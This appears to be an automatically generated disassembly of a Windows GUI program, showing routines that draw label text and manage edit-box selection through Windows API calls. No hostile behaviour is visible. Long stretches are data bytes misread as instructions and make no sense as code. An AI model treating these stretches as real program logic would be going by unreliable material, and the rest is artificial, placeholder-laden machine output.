add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov esp 0x103c0043
inc eax
add [ eax ] al
add [ eax ] al
add al dh
lea eax [ bx + si ]
adc al 0x4a
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
je r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
dec ebx
inc ebx
add [ eax + eax ] ch
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
inc ecx
add [ eax + 0x70 ] cl
inc ebx
add [ eax - 0x11 ] ch
inc ecx
add [ eax ] ah
xor [ eax ] eax
xor al 0xef
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
inc eax
add al cl
xor eax [ eax ]
outsd
les esi [ ebx ]
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
add al 0x31
insb
add [ 0x65646e49 ] al
js r-xdata
sub_434d30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi + 0x43 ] cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x43 ] cl
add [ esi + 0x4e ] bh
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax + 0x4800434b ] bh
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
inc esp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add ah bl
jb r-xdata
inc ebx
add [ ecx + esi * 2 + 0x1f200043 ] dh
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x10 ] al
jae r-xdata
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
xor eax 0xeb0014bd
add [ ebp + esi + 0x44 ] dl
add [ esp + esi * 2 ] ch
inc ebx
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
add ah ch
add [ ebp + esi * 2 + 0x43 ] cl
add [ esp + esi * 2 + 0x43 ] al
add ah cl
jne r-xdata
jae r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x54 ] ax
jno r-xdata
inc eax
inc ebx
add [ ecx ] ah
add bh bh
add al 0xef
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
add [ eax + 0x40004375 ] ah
add [ eax + 0x4106000b ] al
add [ edi ] al
push esp
inc edx
jne r-xdata
mov eax eax
mov [ esi + 0x43 ] cs
add [ edi ] al
pop es
add [ eax + 0x68004371 ] dh
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jo r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
add [ ebx + esi * 2 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
je r-xdata
add dh bh
aam 0xfc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
push esp
inc edx
jne r-xdata
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
add [ eax ] al
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
add [ eax + 0x4208000d ] al
outsb
js r-xdata
dec eax
[ eax + 0x74 ]
inc ebx
add al cl
je r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
add bh bh
mov eax 0x1004420
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi ] al
inc ebx
add [ eax ] al
dec ebp
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
sbb [ ecx - 0x44fffbd ] ch
inc ebx
add al ah
sti
inc ebx
add al ah
sbb eax [ eax + eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
inc ebx
add [ eax + 0x43ef ] ah
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
popad
add [ eax ] al
inc [ edi + ebp * 8 ]
imul eax [ ecx ] 0xfe00003c
and al 0xef
add ah ch
sub_4359c1
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_447654
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43f36c
mov edx 0x11
mov eax esi
call sub_43f390
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_435a64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435bba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441ec4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4228ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404208
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x160 ]
call sub_4229f0
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_421a0c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x160 ]
call sub_4229f0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_421a0c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x160 ]
call sub_4229f0
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435bc1
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_435bcb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_435df4
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_422314
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4221f8
xor edx edx
mov eax [ esi + 0x14 ]
call sub_422314
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4225d0
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403368
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403368
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_435cec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_422a70
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403368
xor edx edx
mov eax [ edi + 0x160 ]
call sub_422a70
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403368
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43c93c
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_435e30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_435df4
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435e90
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403368
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435eb8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f080
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_435f1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435fa9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435fb0
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fbb0
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457500
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403368
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_436000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4420f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43f36c
mov edx 0x19
mov eax esi
call sub_43f390
mov dl 0x1
mov eax esi
call sub_446684
xor edx edx
mov eax esi
call sub_43fd74
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_436690
mov eax esi
test bl bl
je r-xdata
sub_4360a8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436114
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_446754
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_436158
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_446754
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_446450
push eax
call SendMessageA
test eax eax
setne bl
sub_436190
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_446754
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4361c8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_446754
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_446450
push eax
call SendMessageA
sub_436204
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_436228
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436248
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_436278
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_446450
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_436330
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43fb24
inc eax
call sub_408c3c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4363ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408c50
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43fb34
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363c1
mov eax [ ebp - 0xc ]
call sub_408c88
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_4363cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404030
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43fb24
inc eax
call sub_408c3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43645a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408c50
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fb34
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408c88
retn
sub_436468
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443258
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443184
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_436521
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_443554
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_443554
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_436594
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_4365d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_443384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4365da
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_4365da
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_436190
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436654
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SendMessageA
sub_436654
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_436690
pop ebx
retn
sub_436690
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_421a20
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43f390
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43675c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_443f44
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_436794
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_446450
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_446450
push eax
call SendMessageA
sub_4367d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445a68
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_436654
mov eax ebx
call sub_44396c
sub_436808
push ebx
mov ebx eax
mov eax ebx
call sub_4459ac
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_436690
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_436850
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445804
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_436314
sub_43688c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446754
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403368
push 0xfffffff0
mov eax esi
call sub_446450
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4368c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_44750c
pop esi
pop ebx
retn
sub_4368e0
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
call sub_446754
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_436950
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_404030
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_436994
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
mov eax edi
call sub_404400
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_446450
push eax
call SendMessageA
sub_436a08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
